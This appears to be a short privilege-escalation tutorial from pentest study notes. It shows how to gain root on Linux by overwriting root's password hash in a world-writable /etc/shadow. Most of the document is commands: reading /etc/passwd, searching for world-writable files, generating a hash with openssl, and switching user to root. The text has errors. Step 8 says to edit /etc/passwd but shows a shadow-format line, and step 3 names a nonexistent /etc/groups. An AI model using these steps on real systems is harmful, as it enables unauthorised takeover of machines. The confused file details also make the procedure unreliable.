### Elevating privileges using weak file permissions 

1. Gain initial access.

2. Check the list of users with `cat /etc/passwd`

3. Check the list of groups available `cat /etc/groups`

4. Enumerate the list of files that can be edited by every user on the system. 
```
find / -not -type l -perm -o+w 
```

5. We can now look for files that we can edit and use to our advantage in order to elevate our privileges. In our case, we have write access to the `/etc/shadow` file. This poses a huge security risk, as we can change the password of the root user.

6. We can confirm that we indeed have write permissions for that file using `ls -la`.

7. The passwords in the `/etc/shadow` file are stored in an encrypted format. We'll use `openssl` to generate an encrypted password for Linux in order to replace the root user's password. 
```
openssl passwd -1 -salt abc <new-password>
```

8. Open the `/etc/passwd` file with a text editor. Copy the new encrypted password and replace the asterisk `*` in the root user's line with it.
```
root:<new-pass>:17764:0:99999:7:::
```

9. Now we can use `su` command to switch to the root user and provide the new password to login as root. 

10. We've now successfully logged in as root and elevated our privileges.
